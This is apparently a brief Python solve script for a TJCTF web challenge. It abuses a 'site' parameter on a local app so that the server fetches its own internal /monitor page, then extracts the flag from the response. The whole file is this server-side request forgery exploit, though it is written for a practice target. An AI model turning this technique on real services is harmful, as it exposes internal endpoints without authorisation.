import requests

BASE_URL = "http://localhost:5000"

text = requests.get(f"{BASE_URL}/?site={BASE_URL}/monitor").text
print(text)
start = text.index("tjctf{")
print(text[start:text.index("}", start)+1])
